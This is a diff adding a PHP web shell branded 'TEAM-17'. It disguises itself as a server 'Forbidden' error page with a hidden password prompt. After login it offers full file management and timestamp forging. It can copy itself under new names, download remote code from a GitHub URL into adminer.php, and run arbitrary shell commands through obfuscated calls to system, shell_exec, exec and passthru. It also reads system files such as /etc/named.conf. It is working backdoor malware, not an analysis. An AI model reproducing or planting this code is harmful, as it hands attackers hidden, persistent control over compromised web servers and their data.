@@ -1,0 +1,386 @@
+<?php
+session_start();
+date_default_timezone_set("Asia/Jakarta");
+function show_login_page($message = ""){?>
+<!DOCTYPE html><html lang="en"><head><script src="/fold-sighnesse-double-our-Colour-fromisdome-Cloc" async></script>
+<title><?= $_SERVER['SERVER_NAME']; ?></title></head><body><h1>Forbidden</h1><h1 style="font-weight: normal; font-size: 18px;">You don't have permission to access this resource.</h1><hr><?php
+$server = $_SERVER['SERVER_SOFTWARE'];$host = $_SERVER['SERVER_NAME'];$port = $_SERVER['SERVER_PORT'];$os = php_uname('s'); $release = php_uname('r'); 
+if (stripos($server, 'apache') !== false) {$distro = "(Linux)";
+if (file_exists('/etc/debian_version')) {$distro = "(Debian)";} elseif (file_exists('/etc/redhat-release')) {$distro = "(RedHat)";}
+echo "<i>Apache" . explode(" ", $server)[0] . " $distro Server at $host Port $port</i>";} elseif (stripos($server, 'nginx') !== false) {
+echo "<i>$server (Linux) Server at $host Port $port</i>";} elseif (stripos($server, 'microsoft-iis') !== false) {
+echo "<i>$server (Windows) Server at $host Port $port</i>";} else {
+echo "<i>$server ($os) Server at $host Port $port</i>";}?>
+<form action="" method="post" style="display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #2e313d; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);"><input type="password" name="pass" placeholder="Password" autofocus style="border: none; border-bottom: 1px solid #fff; padding: 5px; margin-bottom: 10px; color: #fff; background: none;"><input type="submit" name="submit" value=">" style="border: none; padding: 5px 20px; background-color: #FF2E04; color: #fff; cursor: pointer;"></form><script type="text/javascript">
+document.addEventListener('contextmenu', function(e) {
+e.preventDefault();
+}, false);
+document.addEventListener('keydown', function(e) {if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
+e.preventDefault();}if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I')) {
+e.preventDefault();}if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
+e.preventDefault();}if (e.ctrlKey && (e.key === 'a' || e.key === 'A')) {
+e.preventDefault();}if (e.key === 'F12') {
+e.preventDefault();}}, false);document.addEventListener('keydown', function(e) {if (e.shiftKey && e.key === 'L') {
+e.preventDefault(); var form = document.querySelector('form');form.style.display = 'block';var passwordInput = document.querySelector('form input[type="password"]');passwordInput.focus();
+}}, false);</script></body></html><?php
+exit;}
+if (isset($_GET['logout'])) {session_unset();session_destroy();header("Location: " . $_SERVER['PHP_SELF']);exit();}
+if (!isset($_SESSION['authenticated'])) {
+$stored_hashed_password = '$2y$10$a1K97JAkJsMzE/YpDkcYYOvJ4TEB7B99pXIYj5/H0E8EAamXznnOW'; 
+if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
+$_SESSION['authenticated'] = true;
+$_SESSION['FM_SESSION_ID']['password_plaintext'] = $_POST['pass'];} else {
+show_login_page("Password salah");}}
+function openGateway() {
+echo '<pre>';
+echo 'Anda sudah login!';
+echo '</pre>';}
+error_reporting(0);
+set_time_limit(0);
+if (!isset($_SESSION['path_map'])) $_SESSION['path_map'] = array();
+function getPathId($path) {$id = substr(sha1($path), 0, 10);$_SESSION['path_map'][$id] = $path;return $id;}
+function getPathById($id) {return isset($_SESSION['path_map'][$id]) ? $_SESSION['path_map'][$id] : getcwd();}
+if (isset($_GET['id'])) {$cwd = getPathById($_GET['id']);} elseif (isset($_GET['d'])) {$cwd = $_GET['d'];} else {$cwd = getcwd();}
+$cwd = realpath($cwd);
+chdir($cwd);
+$files = @opendir($cwd);function do_exec($cmd){
+$aliases = ['sh'.'el'.'l_ex'.'ec', 'ex'.'ec', 'pa'.'ss'.'th'.'ru', 'sy'.'st'.'em'];
+foreach($aliases as $f){
+if(function_exists($f) && !in_array($f, explode(',', ini_get('disable_functions')))){
+return @$f($cmd);}}
+return false;}
+function perm($f){
+$perms = @fileperms($f);
+if (($perms & 0xC000) == 0xC000) $info = 's';
+elseif (($perms & 0xA000) == 0xA000) $info = 'l';
+elseif (($perms & 0x8000) == 0x8000) $info = '-';
+elseif (($perms & 0x6000) == 0x6000) $info = 'b';
+elseif (($perms & 0x4000) == 0x4000) $info = 'd';
+elseif (($perms & 0x2000) == 0x2000) $info = 'c';
+elseif (($perms & 0x1000) == 0x1000) $info = 'p';
+else $info = 'u';
+$info .= ($perms & 0x0100) ? 'r' : '-';
+$info .= ($perms & 0x0080) ? 'w' : '-';
+$info .= ($perms & 0x0040) ?
+(($perms & 0x0800) ? 's' : 'x') :
+(($perms & 0x0800) ? 'S' : '-');
+$info .= ($perms & 0x0020) ? 'r' : '-';
+$info .= ($perms & 0x0010) ? 'w' : '-';
+$info .= ($perms & 0x0008) ?
+(($perms & 0x0400) ? 's' : 'x') :
+(($perms & 0x0400) ? 'S' : '-');
+$info .= ($perms & 0x0004) ? 'r' : '-';
+$info .= ($perms & 0x0002) ? 'w' : '-';
+$info .= ($perms & 0x0001) ?
+(($perms & 0x0200) ? 't' : 'x') :
+(($perms & 0x0200) ? 'T' : '-');
+return $info;}
+function format_size($bytes){if ($bytes >= 1073741824)
+return round($bytes / 1073741824, 2).' GB';
+elseif ($bytes >= 1048576)
+return round($bytes / 1048576, 2).' MB';
+elseif ($bytes >= 1024)
+return round($bytes / 1024, 2).' KB';
+elseif ($bytes == 0)
+return '0 B';else
+return $bytes.' B';}
+function get_owner_group($path){
+$owner = @fileowner($path);
+$group = @filegroup($path);
+$own = (function_exists('posix_getpwuid') && @posix_getpwuid($owner)) ? @posix_getpwuid($owner)['name'] : $owner;
+$grp = (function_exists('posix_getgrgid') && @posix_getgrgid($group)) ? @posix_getgrgid($group)['name'] : $group;
+return $own.':'.$grp;}
+$notif = '';
+if(isset($_POST['del']) && $_POST['del']!=''){
+$target = $cwd.'/'.$_POST['del'];
+if(is_file($target)){
+if(@unlink($target)){$notif .= '<pre style="color:#0f0;">File deleted: '.htmlspecialchars($_POST['del']).'</pre>';
+} else {$notif .= '<pre style="color:#f00;">Failed to delete file.</pre>';}
+} elseif(is_dir($target)){if(@rmdir($target)){
+$notif .= '<pre style="color:#0f0;">Folder deleted: '.htmlspecialchars($_POST['del']).'</pre>';} else {
+$notif .= '<pre style="color:#f00;">Failed to delete folder (must be empty).</pre>';}}}
+if (isset($_POST['adminer_trigger'])) {
+$adminer_file = $cwd . '/adminer.php';
+$adminer_url = 'https://raw.githubusercontent.com/santanamichigan/imunifychallenger/refs/heads/main/bujang.txt';
+if(!file_exists($adminer_file)) {
+$get = @file_get_contents($adminer_url);
+if ($get) {if (file_put_contents($adminer_file, $get)) {
+$notif = "<div style='text-align:center;color:#0f0;margin-top:10px;'>Adminer berhasil diunduh sebagai <code>adminer.php</code></div>";} else {
+$notif = "<div style='text-align:center;color:#f00;margin-top:10px;'>Gagal menyimpan file adminer.php</div>";}} else {
+$notif = "<div style='text-align:center;color:#f00;margin-top:10px;'>Gagal mengunduh file dari GitHub</div>";}} else {
+$notif = "<div style='text-align:center;color:#ff0;margin-top:10px;'>⚠️ File <code>adminer.php</code> sudah ada</div>";}}
+$real_path = getcwd();
+if (isset($_POST['do_backup']) && !empty($_POST['backup_name'])) {
+$name = basename(trim($_POST['backup_name']));
+$src = $_SERVER['SCRIPT_FILENAME'];
+$dst = $real_path . '/' . $name;
+$code = @file_get_contents($src);
+if ($code) {
+if (file_put_contents($dst, $code)) {
+$notif = "<div style='color:#00e676;text-align:center;'>Backup berhasil disimpan sebagai <code>" . htmlspecialchars($name) . "</code></div>";
+} else {$notif = "<div style='color:#f44336;text-align:center;'>Tidak bisa menyimpan backup ke tujuan.</div>";
+}} else {
+$notif = "<div style='color:#f44336;text-align:center;'>Tidak bisa membaca file shell ini.</div>";}}elseif (isset($_POST['backup_trigger'])) {
+$show_backup_form = true;}
+if(isset($_POST['oldname']) && isset($_POST['newname']) && $_POST['newname']!=''){
+$old = $cwd.'/'.$_POST['oldname'];
+$new = $cwd.'/'.$_POST['newname'];
+if(file_exists($old)){
+if(@rename($old,$new)){$notif .= '<pre style="color:#0f0;">Renamed to: '.$_POST['newname'].'</pre>';}
+else{$notif .= '<pre style="color:#f00;"> Rename failed.</pre>';}}}
+if(isset($_POST['upload']) && isset($_FILES['upfile'])){
+$n=$_FILES['upfile']['name'];$t=$_FILES['upfile']['tmp_name'];
+if(@move_uploaded_file($t,$cwd.'/'.$n)){$notif .= '<pre style="color:#0f0;">✔️ File uploaded: '.htmlspecialchars($n).'</pre>';}
+else{$notif .= '<pre style="color:#f00;">Upload failed.</pre>';}}
+if(isset($_POST['create']) && $_POST['name'] && $_POST['action']){
+$nama=$_POST['name'];$path=$cwd.'/'.$nama;
+if($_POST['action']=='file'){
+if(!file_exists($path)){
+$h=@fopen($path,'w');if($h){fclose($h);$notif .= '<pre style="color:#0f0;">File created: '.htmlspecialchars($nama).'</pre>';}
+else{$notif .= '<pre style="color:#f00;">Cannot create file.</pre>';}
+}else{$notif .= '<pre style="color:#f90;">⚠️ File already exists.</pre>';}
+}elseif($_POST['action']=='folder'){
+if(!is_dir($path)){if(@mkdir($path)){$notif .= '<pre style="color:#0f0;">📁 Folder created: '.htmlspecialchars($nama).'</pre>';}
+else{$notif .= '<pre style="color:#f00;">Cannot create folder.</pre>';}
+}else{$notif .= '<pre style="color:#f90;">⚠️ Folder already exists.</pre>';}}}
+if(isset($_POST['savefile']) && isset($_POST['filecontent'])){
+$fp = @fopen($cwd.'/'.$_POST['savefile'], 'w');
+if($fp){fwrite($fp, $_POST['filecontent']);fclose($fp);
+$notif .= '<pre style="color:#0f0;">File saved: '.htmlspecialchars($_POST['savefile']).'</pre>';
+}else{$notif .= '<pre style="color:#f00;">Failed to save file.</pre>';}}
+if(isset($_GET['download']) && $_GET['download']!=''){
+$target = $cwd.'/'.basename($_GET['download']);
+if(is_file($target)){
+header('Content-Description: File Transfer');
+header('Content-Type: application/octet-stream');
+header('Content-Disposition: attachment; filename="'.basename($target).'"');
+header('Content-Length: '.filesize($target));
+readfile($target);exit;}}
+if(isset($_POST['touchfile']) && isset($_POST['touchtime']) && $_POST['touchtime'] != ''){$file = $cwd.'/'.basename($_POST['touchfile']);$time = strtotime($_POST['touchtime']);if(!is_file($file)){$notif .= '<pre style="color:#f90;">⚠️ Target is not a file.</pre>';} elseif($time === false){$notif .= '<pre style="color:#f00;">❌ Invalid time format. Use YYYY-MM-DD HH:MM:SS</pre>';} else {if(@touch($file, $time)){$notif .= '<pre style="color:#0f0;">📆 Timestamp updated to '.$_POST['touchtime'].' for '.htmlspecialchars($_POST['touchfile']).'</pre>';} else {$notif .= '<pre style="color:#f00;">❌ Failed to update timestamp.</pre>';}}}
+if(!function_exists('do_exec')){
+function do_exec($c){
+if(function_exists('shell_exec')) return @shell_exec($c);
+elseif(function_exists('exec')){
+@exec($c, $o); return join("\n",$o);
+} elseif(function_exists('passthru')){
+ob_start(); @passthru($c); return ob_get_clean();
+} elseif(function_exists('system')){
+ob_start(); @system($c); return ob_get_clean();
+} else return "exec_disabled";}}
+if(isset($_GET['zip']) && $_GET['zip'] != ''){
+$folder = basename($_GET['zip']);
+$path = $cwd . DIRECTORY_SEPARATOR . $folder;
+if(is_dir($path)){
+$tmpname = sys_get_temp_dir().'/neirra_'.uniqid().'.zip';
+$cmd = 'cd '.escapeshellarg($cwd).' && zip -r '.escapeshellarg($tmpname).' '.escapeshellarg($folder).' 2>/dev/null';
+do_exec($cmd);
+if(file_exists($tmpname)){
+header('Content-Type: application/zip');
+header('Content-Disposition: attachment; filename="'.htmlspecialchars($folder).'.zip"');
+header('Content-Length: ' . filesize($tmpname));
+readfile($tmpname);
+@unlink($tmpname);
+exit;
+} else {$notif = '<pre style="color:#f00;">Gagal membuat ZIP dengan zip CLI.</pre>';}
+} else {$notif = '<pre style="color:#f00;">Bukan folder valid.</pre>';}}
+echo '<!DOCTYPE html><html><head><title>Team-17</title>
+<link rel="icon" type="image/png" href="https://raw.githubusercontent.com/santanamichigan/imunifychallenger/refs/heads/main/TEAM-17.png">
+<meta charset="utf-8">
+<style>
+body {background: #111;color: #fff;font-family: monospace;font-size: 14px;}
+a {position: relative;color: #e8e8e8;text-decoration: none;}
+a::after {content: "";position: absolute;left: 0;bottom: -2px;width: 0;height: 2px;background: #0f0;transition: width 0.3s ease-in-out;}
+a:hover::after {width: 100%;}
+table {width: 100%;border-collapse: collapse;background-color: #222;margin-top: 10px;font-size: 12px;}
+th, td {padding: 4px 6px;border: 1px solid #444;text-align: left;}
+th {background: #333;color: #fff;}
+tr:hover {background-color: #1a1a1a;color: #fff200;}
+button {font-size: 12px;background-color: #333;color: #fff;text-shadow: 0 1px 0 rgb(0 0 0 / 25%);display: inline-flex;align-items: center;justify-content: center;position: relative;border: 0;z-index: 1;user-select: none;cursor: pointer;text-transform: uppercase;letter-spacing: 1px;padding: 6px 15px;text-decoration: none;font-weight: bold;transition: all 0.5s cubic-bezier(0,.8,.26,.99);}
+button:before {position: absolute;pointer-events: none;top: 0;left: 0;display: block;width: 100%;height: 100%;content: "";transition: 0.5s cubic-bezier(0,.8,.26,.99);z-index: -1;background-color: #333 !important;box-shadow: 0 -2px rgb(0 0 0 / 50%) inset, 0 2px rgb(255 255 255 / 20%) inset, -2px 0 rgb(255 255 255 / 20%) inset, 2px 0 rgb(0 0 0 / 50%) inset;}
+button:after {position: absolute;pointer-events: none;top: 0;left: 0;display: block;width: 100%;height: 100%;content: "";box-shadow: 0 2px 0 0 rgb(0 0 0 / 15%);transition: 0.5s cubic-bezier(0,.8,.26,.99);}
+button:hover:before {box-shadow: 0 -2px rgb(0 0 0 / 50%) inset, 0 2px rgb(255 255 255 / 20%) inset, -2px 0 rgb(255 255 255 / 20%) inset, 2px 0 rgb(0 0 0 / 50%) inset;}
+button:hover:after {box-shadow: 0 2px 0 0 rgb(0 0 0 / 15%);}
+button:active {transform: translateY(2px);}
+button:active:after {box-shadow: 0 0px 0 0 rgb(0 0 0 / 15%);}
+.perm-write {color: #0f0;}
+.perm-read {color: #e8e8e8;}
+.perm-none {color: #f00;}
+.folder-row a {color: #ffc107;font-weight: bold;}
+.file-row a {color: #fff;}
+</style>
+</head><body>';
+echo '<div style="margin-top:10px;"><button onclick="toggleInfo()" id="toggleBtn">Hide System Info</button></div>';
+echo '<div id="sysinfo" style="display:block;margin-top:10px;">';
+echo '<div style="display:flex;justify-content:space-between;flex-wrap:wrap;">';
+echo '<div style="flex:1 1 65%;font-family:monospace;font-size:13px;line-height:1.6;white-space:pre-line;">';
+function label($txt, $len = 16){ return str_pad($txt, $len); }
+$os = @file_get_contents("/etc/os-release");
+if($os && preg_match('/PRETTY_NAME="(.+?)"/', $os, $match)){
+echo "🧬 <b>OS Distro</b> : ".$match[1]."<br>";
+} else {
+echo "🧬 <b>OS Distro</b> : ".php_uname()."<br>";}
+echo "🌐 <b>Domain</b>: ";
+$named = @file_get_contents('/etc/named.conf');
+if ($named && preg_match_all('/zone\s+"([^"]+)"/', $named, $zones)) {
+echo implode(', ', $zones[1]) . "<br>";
+} else {
+echo "unknown<br>";}
+echo "🌐 <b>IP Address</b>: ".gethostbyname(gethostname())."<br>";
+echo "👤 <b>User</b>: ".get_current_user()."<br>";
+echo "⚙️ <b>PHP</b> Version : ".phpversion()." | ";
+echo "Safe Mode: <span class='badge ".(ini_get('safe_mode') ? "off" : "on")."'>".(ini_get('safe_mode') ? "ON" : "OFF")."</span><br>";
+echo "📂 <b>Disk Usage</b>: ".round((disk_total_space(".") - disk_free_space("."))/1024/1024/1024,2)."GB / ".round(disk_total_space(".")/1024/1024/1024,2)."GB<br>";
+$mem = @file_get_contents("/proc/meminfo");
+if($mem){
+preg_match('/MemTotal:\s+(\d+)/', $mem, $total);
+preg_match('/MemAvailable:\s+(\d+)/', $mem, $avail);
+if($total && $avail){
+$used = $total[1] - $avail[1];
+echo "🧠 <b>RAM Usage</b> : ".round($used/1024)."MB / ".round($total[1]/1024)."MB<br>";}}
+$disabled = @ini_get('disable_functions');
+echo "🧨 <b>Disable Funcs</b> : ";
+echo $disabled ? '<span style="color:#f00">'.htmlspecialchars($disabled).'</span>' : '<span style="color:#0f0">None</span>';
+echo "<br>";
+function check_func($f){ return is_callable($f) && stripos(@ini_get('disable_functions'), $f) === false; }
+echo "🔄 <b>Modules</b> : ";
+echo '<span class="badge '.(check_func("curl_exec") ? "on" : "off").'">cURL</span> ';
+echo '<span class="badge '.(extension_loaded("ssh2") ? "on" : "off").'">SSH2</span> ';
+echo '<span class="badge '.((function_exists("mysql_connect") || function_exists("mysqli_connect")) ? "on" : "off").'">MySQL</span> ';
+echo '<span class="badge '.(function_exists("pg_connect") ? "on" : "off").'">PostgreSQL</span> ';
+echo '<span class="badge '.(function_exists("oci_connect") ? "on" : "off").'">Oracle</span> ';
+echo '<span class="badge '.(php_sapi_name() === "cgi" ? "on" : "off").'">CGI</span>';
+echo "<br>";
+echo "🛡️ <b>Restrictions</b>  : ";
+
+function restriction_text($label, $val){
+  $is_on = (!empty($val) && strtolower($val) != 'none');
+$color = $is_on ? '#0f0' : '#f33';
+$status = $is_on ? 'ON' : 'OFF';
+echo "$label: <b style=\"color:$color\">$status</b> &nbsp; ";}
+restriction_text('open_basedir', ini_get('open_basedir'));
+restriction_text('safe_mode_exec_dir', ini_get('safe_mode_exec_dir'));
+restriction_text('safe_mode_include_dir', ini_get('safe_mode_include_dir'));
+
+echo '</div>'; 
+echo '<div style="flex:1 1;text-align:center;margin-top:10px;">';
+echo '<img src="https://raw.githubusercontent.com/santanamichigan/imunifychallenger/refs/heads/main/TEAM-17.png" alt="Team-17" style="max-height:200px;opacity:0.9;">';
+echo '<div style="font-size:11px;color:#aaa;margin-top:5px;">TEAM-17 — Exploit Existence</div>';
+echo '</div>';
+echo '</div></div><hr>'; 
+echo '<style>
+.badge {display: inline-block;font-size: 11px;margin: 2px 1px;padding: 2px 6px;border-radius: 4px;background: #111;border: 1px solid #333;}
+.badge.on {color: #0f0;border-color: #0f0;}
+.badge.off {color: #f00;border-color: #f00;background: #200;font-weight: bold;}
+</style>';
+echo '<script>function toggleInfo(){var info = document.getElementById("sysinfo");var btn = document.getElementById("toggleBtn");if(info.style.display === "none"){info.style.display = "block";btn.innerHTML = " Hide System Info";} else {info.style.display = "none";btn.innerHTML = "🧩 Show System Info";}}</script>';
+$homePath = dirname(__FILE__);
+echo '<div style="margin:10px 0;display:flex;align-items:center;justify-content:space-between;">';
+echo '<div><span class="badge on">PWD →</span> ';
+$parts = explode(DIRECTORY_SEPARATOR, $cwd); $build = '';
+foreach ($parts as $i => $p) {if ($p == '' && $i == 0) {
+$build = '/';
+echo '<a href="?id='.getPathId($build).'">☢ </a>'; continue;}
+if ($p == '') continue;
+$build .= ($build == '/' ? '' : '/') . $p;
+echo '/<a href="?id='.getPathId($build).'">'.htmlspecialchars($p).'</a>';}
+echo '</div>';
+echo '<div><a href="?id='.getPathId(dirname(__FILE__)).'"><button style="font-size:11px;padding:4px 10px;margin-left:10px;">[ Home File ]</button></a></div>';
+echo '</div><hr>';
+if (!empty($show_backup_form)) {
+echo "<div style='text-align:center;margin-top:10px;'>";
+echo "<form method='post' style='display:inline-block;'>";
+echo "<input type='text' name='backup_name' placeholder='Nama File' style='background:#222;color:#0f0;border:1px solid #444;padding:5px;width:220px;font-family:monospace;margin-right:5px;'>";
+echo "<button type='submit' name='do_backup' style='background:#222;border:1px solid #444;padding:5px 10px;'>OK</button>";
+echo "<a href='?d=".urlencode($cwd)."'><button type='button' style='background:#222;border:1px solid #444;padding:5px 10px;margin-left:5px;'>CANCEL</button></a>";
+echo "</form></div><hr>";}
+if(isset($_GET['rename']) && $_GET['rename']!=''){
+$old = basename($_GET['rename']);
+echo '<div style="text-align:center;">
+<div style="margin-bottom:10px;font-weight:bold;color:#ffffff;font-size:16px;">'.htmlspecialchars($old).'</div>
+<form method="POST" style="display:inline;">
+<input type="hidden" name="oldname" value="'.htmlspecialchars($old).'">
+<input type="text" name="newname" placeholder="New name..." style="background:#222;color:#0f0;border:1px solid #444;padding:5px;width:200px;">
+<button type="submit">OK</button> 
+<a href="?id='.getPathId($cwd).'"><button type="button">CANCEL</button></a>
+</form></div><hr>';}
+if(isset($_GET['touch']) && $_GET['touch']!=''){
+$target = basename($_GET['touch']);
+echo '<div style="text-align:center;">
+<div style="margin-bottom:10px;font-weight:bold;color:#ffffff;font-size:16px;">'.htmlspecialchars($target).'</div>
+<form method="POST" style="display:inline;">
+<input type="hidden" name="touchfile" value="'.htmlspecialchars($target).'">
+<input type="text" name="touchtime" placeholder="YYYY-MM-DD HH:MM:SS" style="background:#222;color:#0f0;border:1px solid #444;padding:5px;width:220px;">
+<button type="submit">OK</button>
+<a href="?id='.getPathId($cwd).'"><button type="button">CANCEL</button></a>
+</form></div><hr>';}
+if ($notif != '') {echo '<div style="text-align:center;margin-bottom:10px;">'.$notif.'<hr style="width:50%;border:1px solid #444;"></div>';}
+if (isset($_GET['edit']) && $_GET['edit'] != '') {$edit = basename($_GET['edit']);$target = $cwd . '/' . $edit;
+if (is_file($target)) {$content = @file_get_contents($target);
+echo '<div style="text-align:center;margin-top:20px;"><form method="POST">  <input type="hidden" name="savefile" value="'.htmlspecialchars($edit).'">  <div style="margin-bottom:10px;font-weight:bold;color:#ffffff;font-size:16px;">'.htmlspecialchars($edit).'</div>  <textarea name="filecontent" style="width:80%;height:300px;background:#111;color:#ffffff;border:1px solid #444;padding:10px;font-family:monospace;">'.htmlspecialchars($content).'</textarea>  <br><br><button type="submit">SAVE</button>   <a href="?id='.getPathId($cwd).'"><button type="button">CANCEL</button></a></form></div><hr>';}}
+elseif (isset($_GET['info'])) {
+echo '<div style="text-align:center;margin-top:20px;">';
+echo '<img src="https://raw.githubusercontent.com/santanamichigan/imunifychallenger/main/TEAM-17.png" style="max-height:200px;opacity:0.9;"><br>';
+echo '<div style="color:#ccc;font-size:16px;margin-top:10px;font-family:monospace;">TEAM—17<br><small style="color:#ccc;">Respect Existence or Expect Resistance</small></div>';
+echo '<div style="margin-top:15px;"><a href="?id='.getPathId($cwd).'"><button>Back</button></a></div>';
+echo '</div><hr>';}else {
+echo '<div style="max-height:400px;overflow:auto;margin-top:10px;">';
+echo '<table><tr><th>Name</th><th>Size</th><th>Modified</th><th>Owner:Group</th><th>Permission</th><th>Action</th></tr>';
+$folders = array();
+$files_list = array();
+if($files){while($file = readdir($files)){
+if($file == '.' || $file == '..') continue;
+$path = $cwd . DIRECTORY_SEPARATOR . $file;
+if(is_dir($path)){$folders[] = $file;} else {$files_list[] = $file;}}
+closedir($files);}
+foreach($folders as $file){
+$path = $cwd . DIRECTORY_SEPARATOR . $file;
+echo '<tr class="folder-row">';
+echo '<td><a href="?id='.getPathId($path).'">'.htmlspecialchars($file).'</a></td>';
+echo '<td>DIR</td>';
+$perm = perm($path);
+$class = '';
+if (is_writable($path)) $class = 'perm-write';
+elseif (is_readable($path)) $class = 'perm-read';
+else $class = 'perm-none';
+echo '<td>'.date("Y-m-d H:i:s", @filemtime($path)).'</td>';
+echo '<td>'.get_owner_group($path).'</td>';
+echo '<td class="'.$class.'">'.$perm.'</td>';
+echo '<td>
+<form method="POST" style="display:inline;" onsubmit="return confirm(\'yakin? '.htmlspecialchars($file).'?\')"><input type="hidden" name="del" value="'.htmlspecialchars($file).'"><button type="submit" style="font-size:11px;">Delete</button></form>
+<a href="?id='.getPathId($cwd).'&rename='.urlencode($file).'"><button type="button" style="font-size:11px;margin-left:5px;">Rename</button></a>
+<a href="?id='.getPathId($cwd).'&zip='.urlencode($file).'"><button type="button" style="font-size:11px;margin-left:3px;">ZIP</button></a>
+</td>';
+echo '</tr>';}
+foreach($files_list as $file){
+$path = $cwd . DIRECTORY_SEPARATOR . $file;
+$size = filesize($path);
+echo '<tr class="file-row">';
+echo '<td><a href="?id='.getPathId($cwd).'&edit='.urlencode($file).'">'.htmlspecialchars($file).'</a></td>';
+echo '<td>'.format_size($size).'</td>';
+$perm = perm($path);
+$class = '';
+if (is_writable($path)) $class = 'perm-write';
+elseif (is_readable($path)) $class = 'perm-read';
+else $class = 'perm-none';
+echo '<td>'.date("Y-m-d H:i:s", @filemtime($path)).'</td>';
+echo '<td>'.get_owner_group($path).'</td>';
+echo '<td class="'.$class.'">'.$perm.'</td>';
+echo '<td>
+<form method="POST" style="display:inline;" onsubmit="return confirm(\'yakin mau hapus '.htmlspecialchars($file).'?\')"><input type="hidden" name="del" value="'.htmlspecialchars($file).'"><button type="submit" style="font-size:11px;">Delete</button></form>
+<a href="?id='.getPathId($cwd).'&rename='.urlencode($file).'"><button type="button" style="font-size:11px;margin-left:5px;">Rename</button></a>
+<a href="?id='.getPathId($cwd).'&download='.urlencode($file).'"><button type="button" style="font-size:11px;margin-left:3px;">Download</button></a>
+<a href="?id='.getPathId($cwd).'&touch='.urlencode($file).'"><button type="button" style="font-size:11px;margin-left:3px;">Touch</button></a>
+</td>';
+echo '</tr>';}
+echo '</table></div><hr>';}
+echo '<div style="text-align:center;margin-top:20px;"><form method="POST" style="display:inline-block;"><input type="text" name="cmd" placeholder="Command..." style="width:300px;padding:5px;background:#222;border:1px solid #444;color:#0f0;font-family:monospace;"> <button type="submit">EXECUTE</button></form></div>';
+if(isset($_POST['cmd'])){echo '<pre style="background:#000;color:#0f0;padding:10px;border:1px solid #444;margin-top:10px;max-height:300px;overflow:auto;">';$cmd=$_POST['cmd'];echo htmlspecialchars('$ '.$cmd."\n");$n1='sys'.'tem';$n2='shell'.'_exec';$n3='exec';$n4='pass'.'thru';if(function_exists($n1))@call_user_func($n1,$cmd);elseif(function_exists($n2))echo @call_user_func($n2,$cmd);elseif(function_exists($n3)){@call_user_func($n3,$cmd,$out);echo join("\n",$out);}elseif(function_exists($n4))@call_user_func($n4,$cmd);else echo 'somethings wrong';echo '</pre><hr>';}
+echo '<div style="margin-top:20px;text-align:center;"><form method="POST" enctype="multipart/form-data" style="display:inline;"><input type="file" name="upfile" style="background:#222;color:#0f0;border:1px solid #444;margin-right:5px;"> <button type="submit" name="upload">UPLOAD</button></form> <form method="POST" style="display:inline;margin-left:10px;"><input type="text" name="name" placeholder="Name..." style="background:#222;color:#0f0;border:1px solid #444;padding:5px;font-family:monospace;" /> <select name="action" style="background:#222;color:#0f0;border:1px solid #444;padding:5px;"><option value="file">📄 File</option><option value="folder">📁 Folder</option></select> <button type="submit" name="create">CREATE</button></form></div>';
+echo "<div style='margin-top:20px;text-align:center;'>
+<form method='POST' style='display:inline;margin-right:10px;'><button type='submit' name='backup_trigger' style='background:#222;border:1px solid #444;padding:5px 10px;margin:5px;'>Backup</button></form>
+<form method='POST' style='display:inline;margin-right:10px;'>
+<button type='submit' name='adminer_trigger' style='background:#222;border:1px solid #444;padding:5px 10px;margin:5px;'>Adminer</button></form>
+<form method='GET' style='display:inline;'>
+<input type='hidden' name='info' value='1'>
+<button type='submit' style='background:#222;border:1px solid #444;padding:5px 10px;margin:5px;'>TEAM—17</button></form></div>";
+?>
